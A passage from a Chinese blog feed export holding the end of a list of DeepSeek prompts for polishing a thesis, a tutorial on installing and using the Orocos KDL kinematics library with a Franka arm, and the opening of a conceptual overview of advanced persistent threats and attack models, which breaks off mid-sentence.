id="引言的吸引力与研究背景的充分性">13.引言的吸引力与研究背景的充分性</h3><p>请评估以下引言的吸引力和研究背景的充分性，[插入论文引言]。确保引言能够吸引读者，清晰地阐述研究背景，明确研究问题，并有效引出研究目的和意义。请提出改进建议，例如：增强引言的吸引力，更充分地阐述研究背景，更清晰地呈现研究问题。最终输出应为润色后的引言，并说明如何提升引言的质量。</p><h3 id="图表标题与注释的清晰性与准确性">14.图表标题与注释的清晰性与准确性</h3><p>请检查以下图表的标题和注释是否清晰、准确，[插入图表标题和注释]。确保标题能够准确概括图表内容，注释能够清晰解释图表信息，并符合学术论文图表规范。请提出修改建议，例如：优化标题表达，补充必要的注释信息，确保图表信息易于理解。最终输出应为润色后的图表标题和注释，并指出需要修改之处。</p><h3 id="公式推导与符号定义的严谨性">15. 公式推导与符号定义的严谨性</h3><p>请检查以下公式推导过程和符号定义是否严谨、规范，[插入公式推导和符号定义]。确保公式推导步骤清晰，逻辑严密，符号定义明确，符合学术论文公式规范。请提出修改建议，例如：补充推导步骤，修正逻辑错误，明确符号定义。最终输出应为润色后的公式推导和符号定义，并指出需要修改之处。</p><h3 id="案例分析的深度与代表性">16. 案例分析的深度与代表性</h3><p>请评估以下案例分析的深度和代表性，[插入案例分析段落]。确保案例选择具有代表性，案例分析深入透彻，能够有效支持论文的论点。请提出改进建议，例如：增强案例分析的深度，补充案例细节，突出案例的代表性。最终输出应为润色后的案例分析段落，并说明如何提升案例分析的质量。</p><h3 id="研究伦理与学术诚信的强调">17. 研究伦理与学术诚信的强调</h3><p>请检查论文中是否充分强调了研究伦理和学术诚信，[提供论文相关部分或全文]。确保论文在研究设计、数据收集、数据分析和论文撰写过程中，严格遵守学术伦理规范，并明确声明研究的学术诚信。请提出改进建议，例如：在适当位置强调研究伦理原则，明确声明学术诚信。最终输出应为修改建议，指出需要在哪些方面加强研究伦理和学术诚信的强调。</p><h3 id="针对特定学术期刊会议的格式调整">18.针对特定学术期刊/会议的格式调整</h3><p>请根据 [目标学术期刊/会议名称]的投稿指南，检查论文格式是否符合要求，[提供论文或相关部分]。包括但不限于：字体、字号、行距、页边距、标题格式、参考文献格式等。请提出详细的格式调整建议，并尽可能提供符合目标期刊/会议要求的格式模板。最终输出应为格式调整建议，并尽可能提供格式化后的论文片段。</p><h3 id="从审稿人角度预判潜在问题并改进">19.从审稿人角度预判潜在问题并改进</h3><p>请从高水平学术期刊审稿人的角度，审视以下段落，[插入论文段落]。预判审稿人可能提出的质疑或批评，例如：研究意义不足，论证不够严谨，方法不够创新，结论不够有力等。请提出针对性改进建议，以提升论文的学术质量，增强论文被高水平期刊接受的可能性。最终输出应为润色建议，并指出潜在的审稿人质疑及相应的改进方向。</p><h3 id="全文的整体学术水平评估与提升建议">20.全文的整体学术水平评估与提升建议</h3><p>请对以下博士论文全文进行整体学术水平评估，[提供博士论文全文]。综合考察论文的选题意义、研究设计、论证逻辑、研究方法、数据分析、结论创新性、学术语言等方面，评估论文是否达到高水平大学博士学位论文的标准。请提出全面的提升建议，包括但不限于：结构优化、内容深化、语言润色、格式规范等，旨在帮助论文整体学术水平更上一层楼。最终输出应为一份详细的评估报告和提升建议，并指出论文的优势和需要改进之处。</p><hr /><p>原文链接：<ahref="https://mp.weixin.qq.com/s/Ea5ZRzjTF06148poBGoVCQ">20个Deepseek高阶喂饭指令——2小时完成毕业论文润色</a></p>]]></content>
    
    
    <categories>
      
      <category>学术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>论文</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Orocos KDL的安装与使用</title>
    <link href="/2025/01/17/Orocos-KDL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2025/01/17/Orocos-KDL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="orocos-kdl的安装与使用">Orocos KDL的安装与使用</h1><h2 id="安装">1. 安装</h2><h3 id="克隆kdl的仓库">1.1 克隆KDL的仓库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/orocos/orocos_kinematics_dynamics.git<br></code></pre></td></tr></table></figure><h3 id="编译以及安装">1.2 编译以及安装</h3><p>进入orocos_kinematics_dynamics下的orocos_kdl文件夹，创建build文件夹，然后进入build文件夹：<br /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> orocos_kinematics_dynamics/orocos_kdl<br><span class="hljs-built_in">mkdir</span> build<br><span class="hljs-built_in">cd</span> build<br></code></pre></td></tr></table></figure></p><p>使用cmake编译：<br /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmake ..<br>make<br></code></pre></td></tr></table></figure></p><p>安装：<br /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> make install<br></code></pre></td></tr></table></figure> 这里的安装路径是默认的/usr/local/include。</p><h3 id="配置cmakelists.txt">1.3 配置CMakeLists.txt</h3><p>在CMakeLists.txt中添加以下内容：<br /><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">find_package</span>(orocos_kdl REQUIRED)<br><span class="hljs-keyword">include_directories</span>(<span class="hljs-variable">$&#123;orocos_kdl_INCLUDE_DIRS&#125;</span>) <span class="hljs-comment"># 添加头文件路径，其实这一步可以不用做，在源代码中直接引用头文件即可</span><br></code></pre></td></tr></table></figure></p><p>在target_link_libraries()中添加${orocos_kdl_LIBRARIES}</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;PROJECT_NAME&#125;</span> <span class="hljs-comment"># 项目名</span><br>  <span class="hljs-variable">$&#123;catkin_LIBRARIES&#125;</span><br>  <span class="hljs-variable">$&#123;orocos_kdl_LIBRARIES&#125;</span><br>)<br></code></pre></td></tr></table></figure><p>有的博客中链接的是orocos-kdlorocos-kdl-models，这里visp_ros仿真环境中使用的是${orocos_kdl_LIBRARIES}。</p><h2 id="使用">2. 使用</h2><h3 id="引用头文件">2.1 引用头文件</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kdl/chain.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kdl/chainfksolver.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kdl/chainfksolverpos_recursive.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kdl/chainiksolverpos_nr.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kdl/chainiksolverpos_nr_jl.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kdl/chainiksolvervel_pinv.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kdl/chainjnttojacsolver.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kdl/chainidsolver_recursive_newton_euler.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kdl/chaindynparam.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kdl/frames_io.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;kdl/solveri.hpp&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="创建机器人模型">2.2 创建机器人模型</h3><p>初始化KDL的chain需要机械臂的DH参数，这里以franka机械臂为例，其DH参数可以在<ahref="https://tq-franka.cn/FCI/control_parameters.html">官方文档</a>中找到。</p><p>我们首先定义好相关变量：<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">KDL::Chain chain_; <span class="hljs-comment">// 机械臂的KDL模型</span><br>KDL::ChainFkSolverPos_recursive* fksolver_; <span class="hljs-comment">// 正运动学求解器</span><br>KDL::ChainJntToJacSolver* jacobian_solver_; <span class="hljs-comment">// 雅克比矩阵求解器</span><br>KDL::ChainDynParam* dyn_param_solver_; <span class="hljs-comment">// 动力学参数求解器</span><br></code></pre></td></tr></table></figure></p><p>通过franka机械臂的DH参数初始化机械臂的KDL模型，调用addSegment()函数添加每个关节的DH参数。(这里是从visp_ros中的vpRobotFrankaSim类中获取的DH参数，实际使用时可能需要根据自己的机械臂进行修改)<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp">chain_.<span class="hljs-built_in">addSegment</span>(<br>    KDL::<span class="hljs-built_in">Segment</span>( KDL::<span class="hljs-built_in">Joint</span>( KDL::Joint::None ), KDL::Frame::<span class="hljs-built_in">DH_Craig1989</span>( <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.333</span>, <span class="hljs-number">0.0</span> ) ) );<br>chain_.<span class="hljs-built_in">addSegment</span>(<br>    KDL::<span class="hljs-built_in">Segment</span>( KDL::<span class="hljs-built_in">Joint</span>( KDL::Joint::RotZ ), KDL::Frame::<span class="hljs-built_in">DH_Craig1989</span>( <span class="hljs-number">0.0</span>, -M_PI_2, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span> ) ) );<br>chain_.<span class="hljs-built_in">addSegment</span>(<br>    KDL::<span class="hljs-built_in">Segment</span>( KDL::<span class="hljs-built_in">Joint</span>( KDL::Joint::RotZ ), KDL::Frame::<span class="hljs-built_in">DH_Craig1989</span>( <span class="hljs-number">0.0</span>, M_PI_2, <span class="hljs-number">0.316</span>, <span class="hljs-number">0.0</span> ) ) );<br>chain_.<span class="hljs-built_in">addSegment</span>(<br>    KDL::<span class="hljs-built_in">Segment</span>( KDL::<span class="hljs-built_in">Joint</span>( KDL::Joint::RotZ ), KDL::Frame::<span class="hljs-built_in">DH_Craig1989</span>( <span class="hljs-number">0.0825</span>, M_PI_2, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span> ) ) );<br>chain_.<span class="hljs-built_in">addSegment</span>(<br>    KDL::<span class="hljs-built_in">Segment</span>( KDL::<span class="hljs-built_in">Joint</span>( KDL::Joint::RotZ ), KDL::Frame::<span class="hljs-built_in">DH_Craig1989</span>( <span class="hljs-number">-0.0825</span>, -M_PI_2, <span class="hljs-number">0.384</span>, <span class="hljs-number">0.0</span> ) ) );<br>chain_.<span class="hljs-built_in">addSegment</span>(<br>    KDL::<span class="hljs-built_in">Segment</span>( KDL::<span class="hljs-built_in">Joint</span>( KDL::Joint::RotZ ), KDL::Frame::<span class="hljs-built_in">DH_Craig1989</span>( <span class="hljs-number">0.0</span>, M_PI_2, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span> ) ) );<br>chain_.<span class="hljs-built_in">addSegment</span>(<br>    KDL::<span class="hljs-built_in">Segment</span>( KDL::<span class="hljs-built_in">Joint</span>( KDL::Joint::RotZ ), KDL::Frame::<span class="hljs-built_in">DH_Craig1989</span>( <span class="hljs-number">0.088</span>, M_PI_2, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span> ) ) );<br>chain_.<span class="hljs-built_in">addSegment</span>(<br>    KDL::<span class="hljs-built_in">Segment</span>( KDL::<span class="hljs-built_in">Joint</span>( KDL::Joint::RotZ ), KDL::Frame::<span class="hljs-built_in">DH_Craig1989</span>( <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.107</span>, <span class="hljs-number">0.0</span> ) ) );<br></code></pre></td></tr></table></figure></p><p>初始化机械臂的正运动学求解器、雅克比矩阵求解器和动力学参数求解器：<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">fksolver_ = <span class="hljs-keyword">new</span> KDL::<span class="hljs-built_in">ChainFkSolverPos_recursive</span>( chain_ );<br>jacobian_solver_ = <span class="hljs-keyword">new</span> KDL::<span class="hljs-built_in">ChainJntToJacSolver</span>( chain_ );<br>dyn_param_solver_ = <span class="hljs-keyword">new</span> KDL::<span class="hljs-built_in">ChainDynParam</span>( chain_, KDL::<span class="hljs-built_in">Vector</span>( <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">-9.81</span> ) );<br></code></pre></td></tr></table></figure></p><h3 id="正运动学求解">2.3 正运动学求解</h3><p>通过机械臂的正运动学求解器求解机械臂的末端位姿：<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">KDL::JntArray <span class="hljs-title">q</span><span class="hljs-params">(<span class="hljs-number">7</span>)</span></span>; <span class="hljs-comment">// 机械臂的关节角度</span><br>KDL::Frame p_out; <span class="hljs-comment">// 机械臂的末端位姿</span><br>fksolver_-&gt;<span class="hljs-built_in">JntToCart</span>( q, p_out ); <span class="hljs-comment">// 调用正运动学求解器求解机械臂的末端位姿</span><br></code></pre></td></tr></table></figure>这里的q是机械臂的关节角度，p_out是机械臂的末端位姿。使用时需要将机械臂的关节角度赋值给q，然后调用fksolver_-&gt;JntToCart(q, p_out )即可得到机械臂的末端位姿。</p><p>p_out是一个4x4的矩阵，可以通过p_out.M和p_out.p分别获取旋转矩阵和平移向量。而机械臂的关节角度q一般可以通过机械臂的驱动器获取。</p><h3 id="雅克比矩阵求解">2.4 雅克比矩阵求解</h3><p>通过机械臂的雅克比矩阵求解器求解机械臂的雅克比矩阵：<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">KDL::JntArray <span class="hljs-title">q</span><span class="hljs-params">(<span class="hljs-number">7</span>)</span></span>; <span class="hljs-comment">// 机械臂的关节角度</span><br>KDL::Jacobian J; <span class="hljs-comment">// 机械臂的雅克比矩阵</span><br>jacobian_solver_-&gt;<span class="hljs-built_in">JntToJac</span>( q, J );<br></code></pre></td></tr></table></figure>可以看到，我们只需要得到机械臂的关节角度q，然后调用jacobian_solver_-&gt;JntToJac(q, J)即可得到机械臂的雅克比矩阵J，这里的J是一个6x7的矩阵，可以通过J.data获取雅克比矩阵的数据，或者直接访问J(i,j)获取雅克比矩阵的第i行第j列的元素。</p><p>JntToJac()函数的第一个参数是机械臂的关节角度，第二个参数是机械臂的雅克比矩阵，第三个参数segmentNR是要计算雅克比矩阵的末端关节的编号，默认为机械臂的末端关节(-1)，如果需要计算其他关节的雅克比矩阵，可以指定segmentNR。官方给出的函数原型如下：<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* Calculate the jacobian expressed in the base frame of the</span><br><span class="hljs-comment">* chain, with reference point at the end effector of the</span><br><span class="hljs-comment">* *chain. The alghoritm is similar to the one used in</span><br><span class="hljs-comment">* KDL::ChainFkSolverVel_recursive</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* @param q_in input joint positions</span><br><span class="hljs-comment">* @param jac output jacobian</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* @return success/error code</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">int</span> <span class="hljs-title">JntToJac</span><span class="hljs-params">(<span class="hljs-type">const</span> JntArray&amp; q_in, Jacobian&amp; jac, <span class="hljs-type">int</span> segmentNR=<span class="hljs-number">-1</span>)</span></span>;<br></code></pre></td></tr></table></figure></p><h3 id="动力学参数求解">2.5 动力学参数求解</h3><p>通过机械臂的动力学参数求解器求解机械臂的动力学参数：<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">KDL::JntArray <span class="hljs-title">q</span><span class="hljs-params">(<span class="hljs-number">7</span>)</span></span>; <span class="hljs-comment">// 机械臂的关节角度</span><br><span class="hljs-function">KDL::JntArray <span class="hljs-title">q_dot</span><span class="hljs-params">(<span class="hljs-number">7</span>)</span></span>; <span class="hljs-comment">// 机械臂的关节速度</span><br><span class="hljs-function">KDL::JntArray <span class="hljs-title">coriolis</span><span class="hljs-params">(<span class="hljs-number">7</span>)</span></span>; <span class="hljs-comment">// 机械臂的科里奥利力矩</span><br><span class="hljs-function">KDL::JntSpaceInertiaMatrix <span class="hljs-title">mass</span><span class="hljs-params">(<span class="hljs-number">7</span>)</span></span>; <span class="hljs-comment">// 机械臂的惯性力矩</span><br>dyn_param_solver_-&gt;<span class="hljs-built_in">JntToCoriolis</span>( q, q_dot, coriolis ); <span class="hljs-comment">// 调用动力学参数求解器求解机械臂的科里奥利力矩</span><br>dyn_param_solver_-&gt;<span class="hljs-built_in">JntToMass</span>( q, mass ); <span class="hljs-comment">// 调用动力学参数求解器求解机械臂的惯性力矩</span><br></code></pre></td></tr></table></figure></p><p>计算机械臂的动力学参数时，需要机械臂的关节角度q和关节速度q_dot，然后调用dyn_param_solver_-&gt;JntToCoriolis(q, q_dot, coriolis)即可得到机械臂的科里奥利力矩coriolis，调用dyn_param_solver_-&gt;JntToMass(q, mass)即可得到机械臂的惯性力矩mass。这里的coriolis和mass都是7维的向量，可以通过coriolis.data和mass.data获取数据，或者直接访问coriolis(i)和mass(i)获取第i个关节的科里奥利力矩和惯性力矩。</p><p>在仿真环境中测试时，发现通过这样的方式求解的科里奥利力矩和惯性力矩是空的，暂时还不清楚原因。</p><p>函数原型如下：<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">int</span> <span class="hljs-title">JntToCoriolis</span><span class="hljs-params">(<span class="hljs-type">const</span> JntArray &amp;q, <span class="hljs-type">const</span> JntArray &amp;q_dot, JntArray &amp;coriolis)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">int</span> <span class="hljs-title">JntToMass</span><span class="hljs-params">(<span class="hljs-type">const</span> JntArray &amp;q, JntSpaceInertiaMatrix&amp; H)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">int</span> <span class="hljs-title">JntToGravity</span><span class="hljs-params">(<span class="hljs-type">const</span> JntArray &amp;q,JntArray &amp;gravity)</span></span>;<br></code></pre></td></tr></table></figure></p><p>最后不要忘记释放内存：<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">delete</span> fksolver_;<br><span class="hljs-keyword">delete</span> jacobian_solver_;<br><span class="hljs-keyword">delete</span> dyn_param_solver_;<br></code></pre></td></tr></table></figure></p><h2 id="参考资料">3. 参考资料</h2><ul><li><a href="https://www.orocos.org/kdl.html">KDL官方网站</a><br /></li><li><ahref="https://github.com/orocos/orocos_kinematics_dynamics">KDL的github仓库</a><br /></li><li><ahref="https://tq-franka.cn/FCI/control_parameters.html">Franka机械臂的DH参数</a><br /></li><li><ahref="https://blog.csdn.net/fqianqian96/article/details/130410510">KDL库安装与使用</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>KDL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>高级持续性威胁与检测技术简述</title>
    <link href="/2025/01/01/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81%E4%B8%8E%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%AE%80%E8%BF%B0/"/>
    <url>/2025/01/01/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81%E4%B8%8E%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%AE%80%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="引言">1. 引言</h2><p>在当今高度互联的数字化世界中，高级持续性威胁（Advanced PersistentThreat,APT）已成为信息安全领域的主要挑战之一。APT是一种由专业化团队精心策划、长期潜伏且目标明确的网络攻击形式，其目标往往集中在窃取敏感信息、破坏关键基础设施或获取持续的网络访问权限。与传统的网络攻击不同，APT具有隐蔽性强、针对性高和持续性长的特点，使其能够成功视过传统安全防护机制，对组织和个人造成严重威胁。近年来，APT攻击的复杂性和频率显著增加，广泛覆盖从金融机构到政府部门在内的多个关键领域。</p><p>近年来，一些显著的APT攻击事件进一步突显了这一威胁的严重性。2020年，SolarWindsOrion平台遭受供应链攻击被攻击者植入恶意代码，造成多个政府部门和企业网络被入侵，持续数月未被发现，最终导致敏感信息的严重泄露。2021年，攻击者利用MicrosoftExchange邮件服务器的漏洞，成功入侵数万个组织的网络，窃取大量敏感信息。这些事件不仅对受害者造成了巨大损失，也引起了全球范围内的关注和警惕。</p><p>APT攻击的复杂性和隐蔽性给传统的安全防护带来了巨大挑战。传统的安全防护技术主要依赖于基于规则的检测方法，如防火墙、入侵检测系统（IntrusionDetection System,IDS）和反病毒软件等。这些技术主要基于已知的攻击特征和行为模式进行检测，对于未知的APT攻击往往无法有效识别和防范。因此，研究和开发新的APT检测技术成为当前信息安全领域的重要课题。</p><p>本文旨在对高级持续性威胁与检测技术进行简述。首先，我们介绍了APT的概念、特点和攻击模型，分析了APT攻击的生命周期和检测载体。在此基础上，我们详细讨论了APT检测技术，包括行为分析、威胁情报、机器学习和深度学习等方面。最后，我们总结了当前技术的挑战和展望，提出了未来研究的方向和建议。通过本文的简述，我们希望能够为APT检测技术的研究和应用提供参考和启示，促进信息安全领域的发展和进步。</p><h2 id="高级持续性威胁">2. 高级持续性威胁</h2><h3 id="概念">2.1 概念</h3><p>高级持续性威胁这一术语由美国空军在2006年首次提出,用于描述任何从事信息战以支撑长期战略目标的复杂的对手。诸多安全机构也对其进行了定义,美国国家标准与技术研究院（National Institute of Standards andTechnology，NIST）对高级持续性威胁的定义是“具有先进专业水平和重要资源的对手”。攻击者的专业技术和资源可以使其通过使用多种攻击载体（如网络、物理和欺骗）创造机会来实现目标,包括在目标组织的信息技术基础架构内建立和扩展立足点, 以窃取信息,破坏或阻碍任务、计划或组织的关键方面; 或者计划在未来实现这些目标。</p><h3 id="特点">2.2 特点</h3><p>APT由高级、持续和威胁三个特征定义。“高级”指攻击者有先进的专业知识和大量资源,能开发特定的工具,使用多种攻击载体以对目标进行持续的攻击。“持续”指APT攻击持续时间长、频率低。攻击者进入目标系统后不会马上发动攻击,而是尽可能潜伏在目标系统,对目标保有长时间的访问权。“威胁”指攻击者意图对目标系统造成损害。</p><p>APT攻击者尝试窃取数据、破坏系统服务以获取利益,这与普通黑客攻击一致。然而, 普通的黑客攻击大多是随机的,且攻击失败后会迅速切换目标。APT的攻击目标是特定的组织机构,并且攻击在数月甚至数年内持续不断进行,并不断适应目标网络的防御措施。其攻击与传统的黑客攻击相比,具有更高的隐蔽性、针对性和持续性，区别如下：</p><ol type="1"><li><p>攻击者：APT攻击者通常是由国家支持的专业团队,具有先进的技术和资源。他们通常会使用定制的工具和技术,以适应目标系统的特点。而传统的黑客攻击者通常是个人或小团体,缺乏专业技术和资源。</p></li><li><p>攻击对象：APT攻击针对特定的组织或个人,通常是政府机构、军事机构、金融机构等关键领域。而传统的黑客攻击通常是随机的,目标广泛, 没有明确的目标。</p></li><li><p>目的：APT攻击的目的通常是窃取敏感信息、破坏关键基础设施或获取持续的网络访问权限，以实现政治、经济或军事目标。而传统的黑客攻击通常是为了获取利益、破坏系统服务，或者仅仅是为了证明自己的技术能力。</p></li><li><p>攻击手段：APT攻击通常采用多种攻击载体,如网络攻击、物理攻击和社会工程攻击等。攻击者会使用多种技术手段,如漏洞利用、木马程序、恶意软件等,以适应目标系统的防御措施，并保持持续的访问权限。而传统的黑客攻击通常采用单一的攻击载体,如网络攻击或恶意软件攻击，维持时间较短。</p></li></ol><h3 id="apt攻击模型">2.3 APT攻击模型</h3><p>APT攻击过程高度复杂,对攻击进行建模是积极主动地识别、分类和描述攻击的过程。攻击模型的建立有助于研究人员理解攻击过程,了解攻击者在每个阶段使用的技术,同时也为防范攻击提供了指导。研究人员从攻击步骤、涉及的资源等角度按需对APT攻击进行建模。常见的攻击模型有杀伤链模型、钻石模型、攻击树模型、ATT&amp;CK模型等。下表对以上攻击模型进行了对比。</p><table><thead><tr><th>模型</th><th>时间</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>攻击树模型</td><td>1995年</td><td>描述系统可能受到的所有攻击, 直观易于理解</td><td>攻击之间的依赖性强</td></tr><tr><td>杀伤链模型</td><td>2011年</td><td>描述攻击者如何实现目标, 有助于识别攻击路径</td><td>无法描述攻击之间的依赖性</td></tr><tr><td>钻石模型</td><td>2013年</td><td>刻画攻击者和攻击目标</td><td>对人工的依赖性强</td></tr><tr><td>ATT&amp;CK模型</td><td>2013年</td><td>灵活适应不同场景</td><td>依赖于人工更新</td></tr></tbody></table><h4 id="杀伤链模型">2.3.1 杀伤链模型</h4><p>杀伤链模型是一种描述攻击者如何实现目标的模型。该模型将攻击过程分解为多个步骤,描述攻击者在每个步骤中使用的技术和资源。杀伤链模型由7个阶段组成,分别为侦察跟踪、武器构建、载荷投递、漏洞利用、安装植入、命令与控制和目标达成。一条杀伤链代表一次入侵或企图入侵,一次APT攻击通常由多条杀伤链组成。</p><p>杀伤链模型的优点是能够帮助研究人员识别攻击路径,了解攻击者在每个阶段使用的技术和资源。通过分析杀伤链,研究人员可以发现攻击者的行为模式,了解攻击者的意图和目标。然而,杀伤链模型无法描述攻击之间的依赖性,也无法描述攻击者在不同阶段之间的转换。因此, 研究人员需要结合其他模型,如攻击树模型和ATT&amp;CK模型, 来全面理解APT攻击。</p><pre><code class=" mermaid">graph TD;    A[侦察] --&gt; B[武器构建]    B --&gt; C[载荷投递]    C --&gt; D[漏洞利用]    D --&gt; E[安装植入]    E --&gt; F[命令控制]    F --&gt; G[目标达成]</code></pre><h4 id="钻石模型">2.3.2 钻石模型</h4><p>钻石模型是Sergio等人于2013年提出的一种入侵分析模型,其确立了入侵活动的4个核心元素: 攻击者、基础设施、能力和受害者,它们分别是“钻石”的四个顶点,顶点之间的边代表它们之间潜在的关系。元特性包含了非核心但重要的元素,如时间戳、方法等,从而支持更高级的分析。Sergio等人还在此基础上加入了社会政治影响和技术两个维度,提出扩展的钻石模型, 结构如下图所示。</p><figure><img src="/img/高级持续性威胁与检测技术简述/钻石模型.png"alt="钻石模型" /><figcaption aria-hidden="true">钻石模型</figcaption></figure><p>钻石模型针对单个事件分析,每一起攻击事件都有一个攻击者通过基础设施上的能力对受害者产生影响,进而达成某种目的。</p><p>钻石模型与杀伤链模型是高度互补的。分析APT事件时,结合钻石模型可使基于杀伤链模型创建的行动路线跨越多个事件,也可对一组事件进行分析, 提供关键战役指标。</p><h4 id="攻击树模型">2.3.3 攻击树模型</h4><p>攻击树模型是一种描述系统可能受到的所有攻击的模型。攻击树模型由RossAnderson于1995年提出,用于描述攻击者如何利用系统的漏洞和弱点实施攻击。攻击树模型采用树状结构,从根节点开始描述攻击者的目标, 